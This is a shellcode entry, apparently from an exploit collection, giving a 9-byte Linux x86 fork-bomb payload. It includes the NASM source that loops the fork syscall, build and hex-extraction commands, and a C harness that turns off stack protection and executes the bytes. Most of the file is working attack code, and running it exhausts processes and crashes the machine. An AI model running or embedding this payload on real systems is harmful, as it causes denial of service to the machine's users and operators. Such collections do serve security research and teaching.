/*
;Title: Linux/x86 - Fork() Bomb Shellcode
; Author: Touhid M.Shaikh
; Contact: https://github.com/touhidshaikh
; Category: Shellcode
; Architecture: Linux x86
; Description: This shellcode may crash ur system if executed in ur sys.
Length: 9 bytes


===COMPILATION AND EXECUTION===

#nasm -f elf32 shell.asm -o shell.o <=== Making Object File

#ld -m elf_i386 shell.o -o shell <=== Making Binary File

#./bin2shell.sh shell <== xtract hex code from the binary(
https://github.com/touhidshaikh/bin2shell)



=================SHELLCODE(INTEL FORMAT)=================

section .text

global _start

_start:

xor eax,eax
add eax,2
int 0x80
jmp _start

===================END HERE============================

Compile with gcc with some options.

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

*/

#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x31\xc0\x83\xc0\x02\xcd\x80\xeb\xf7";

main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}